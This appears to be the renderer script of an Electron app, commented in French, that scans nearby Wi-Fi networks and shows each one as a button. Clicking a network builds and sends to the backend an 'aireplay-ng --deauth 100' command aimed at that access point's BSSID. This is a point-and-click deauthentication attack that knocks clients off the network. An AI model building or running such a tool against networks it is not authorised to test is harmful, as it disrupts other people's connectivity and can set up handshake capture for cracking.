let networkslist = []; // Déclaration d'une variable globale pour stocker les réseaux Wi-Fi

// renderer.js (gère le clic sur le bouton)
window.addEventListener('DOMContentLoaded', () => {
    const buttonwifi = document.getElementById('validatebuttonwifi');
    const container = document.getElementById('buttonContainer');
    // Ajoute un événement de clic pour déclencher une action backend

    buttonwifi.addEventListener('click', () => {
        window.appapi.logreport('Clic sur le bouton wifi');
      // Appelle la méthode exposée par preload.js
      window.materialapi.wifianalyser();
    });

    window.refreshapi.wifianalyser((event, networks) => {
        networkslist = networks; // Mettre à jour la variable globale
        window.appapi.logreport(`Réseaux wifi mis à jour: ${JSON.stringify(networkslist, null, 2)}`);
        displayNetworks(); // Afficher les réseaux
    });

    buttonContainer.addEventListener('click', (event) => {
            // Vérifier si l'élément cliqué est un bouton
            if (event.target.tagName === 'BUTTON') {
            // Extraire le BSSID de l'ID du bouton (par exemple "36:eb:b6:bf:ad:8a")
            const bssid = event.target.id;
      
              // Rechercher le réseau correspondant dans la liste
            const network = networkslist.find(net => net.bssid === bssid);
      
            if (network) {
                // Loguer les informations du réseau trouvé
                window.appapi.logreport(`Réseau selectioné pour éxécuter la commande aircrack\n : ${JSON.stringify(network, null, 2)}`);
                const command = `aireplay-ng --deauth 100 -a ${bssid} wlan0mon`;
                window.materialapi.aircrackattack(command);
            } else {
                window.appapi.logreport(`Réseau non trouvé pour le BSSID: ${bssid}`);
            }
        }
    });

    function displayNetworks() {
        // Crée un bouton pour chaque réseau wifi
        container.innerHTML = ''; // Efface les boutons précédents
        networkslist.forEach(networkslist => {
            const button = document.createElement('button');
            const simplifiedsecurity = networkslist.security.slice(0, 4);
            button.textContent = `SSID: ${networkslist.ssid || 'Non Détecté'} - Security: ${simplifiedsecurity} - BSSID: ${networkslist.bssid}`;
            button.id = networkslist.bssid;
            container.appendChild(button);

            // Ajoute un événement de clic pour chaque bouton wifi
            button.addEventListener('click', () => {
                window.appapi.logreport(`Clic sur le bouton wifi avec BSSID: ${networkslist.bssid}`);
                // Fait quelque chose avec le BSSID du réseau wifi sélectionné
            });
        });
      };
  });
  